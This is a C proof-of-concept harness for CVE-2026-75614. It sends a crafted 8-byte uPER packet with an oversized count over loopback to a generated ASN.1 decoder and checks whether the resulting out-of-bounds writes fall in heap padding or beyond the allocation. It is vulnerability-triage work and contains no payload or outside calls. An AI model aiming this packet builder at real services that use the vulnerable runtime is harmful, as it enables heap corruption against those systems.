/* Loopback-only consumer-reality service for CVE-2026-75614.
 *
 * Accepts one 8-byte uPER packet on 127.0.0.1 and calls the generated
 * Payload_Decode against the pinned 4.6.0.17 (or 4.7.0.1) C runtime.  Two
 * allocation modes expose the consumer-reality question for AGENTS.md:
 *   natural : malloc(sizeof(Payload)) == 12 bytes (what a generated-type
 *             consumer actually allocates; arr[5]/arr[6] land in tail padding)
 *   exact   : malloc(9) bytes (frontier harness staging; arr[5] is the first
 *             byte after the allocation, so ASan sees the store)
 *
 * Build: see run/consumer.sh.  All traffic stays on 127.0.0.1.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <malloc.h>
#include "asn1crt_encoding.h"
#include "schema.h"

/* Same overlap-solving packet builder as the frontier driver. */
static void make_packet(unsigned char *wire, int count, const unsigned char *chosen)
{
    int i;
    memset(wire, 0, 8);
    wire[0] = (unsigned char)(((count & 7) << 5) | (chosen[0] >> 3));
    for (i = 1; i < count; i++)
        wire[i] = (unsigned char)(((chosen[i-1] & 0x07) << 5) | (chosen[i] >> 3));
    wire[count] = (unsigned char)((chosen[count-1] & 0x07) << 5);
}

static int read_full(int fd, unsigned char *buf, int n)
{
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

int main(int argc, char **argv)
{
    const char *role = argc > 1 ? argv[1] : "server";
    const char *alloc = argc > 2 ? argv[2] : "natural";
    int port = argc > 3 ? atoi(argv[3]) : 39017;
    int count = argc > 4 ? atoi(argv[4]) : 7;
    int pattern = argc > 5 ? atoi(argv[5]) : 0;
    unsigned char chosen[7], wire[8];
    int i;
    unsigned char *p;
    size_t usable;

    for (i = 0; i < 7; i++)
        chosen[i] = pattern ? (unsigned char)(i % 2 ? 0x5a : 0xa5)
                            : (unsigned char)(i % 2 ? 0xa5 : 0x5a);
    make_packet(wire, count, chosen);

    if (!strcmp(role, "client")) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        if (fd < 0) return 2;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (write(fd, wire, 8) != 8) { close(fd); return 2; }
        close(fd);
        printf("client sent 8 bytes to 127.0.0.1:%d count=%d pattern=%d\n",
               port, count, pattern);
        return 0;
    }

    /* server */
    {
        int lfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        int fd, yes = 1;
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (listen(lfd, 1) != 0) return 2;
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        close(lfd);
        if (read_full(fd, wire, 8) != 0) { close(fd); return 2; }
        close(fd);
    }

    if (!strcmp(alloc, "exact")) p = (unsigned char *)malloc(9);
    else p = (unsigned char *)malloc(sizeof(Payload));
    if (!p) return 2;
    usable = malloc_usable_size(p);

    ((Payload *)p)->nCount = 0;
    memset(((Payload *)p)->arr, 0, 5);

    {
        BitStream bs;
        int err = -1;
        flag ok;
        BitStream_AttachBuffer(&bs, wire, (long)sizeof(wire));
        ok = Payload_Decode((Payload *)p, &bs, &err);
        printf("svc alloc=%s sizeof=%zu usable=%zu ok=%d err=%d decoded=%d\n",
               alloc, sizeof(Payload), usable, ok, err,
               ((Payload *)p)->nCount);
    }

    /* Natural mode only: dump exactly sizeof(Payload)=12 bytes.  Reading past
     * that in the ASan build would itself be an OOB READ and muddy the result. */
    if (!strcmp(alloc, "natural")) {
        printf("object bytes (offset 0..%zu): ", sizeof(Payload) - 1);
        for (i = 0; i < (int)sizeof(Payload); i++) printf("%02x", p[i]);
        printf("\nusable=%zu arr_off=%zu arr5_off=%zu expected=",
               usable, (size_t)((char *)((Payload *)p)->arr - (char *)p),
               (size_t)((char *)((Payload *)p)->arr - (char *)p) + 5);
        for (i = 0; i < 7; i++) printf("%02x", chosen[i]);
        printf("\n");
    }
    free(p);
    return 0;
}
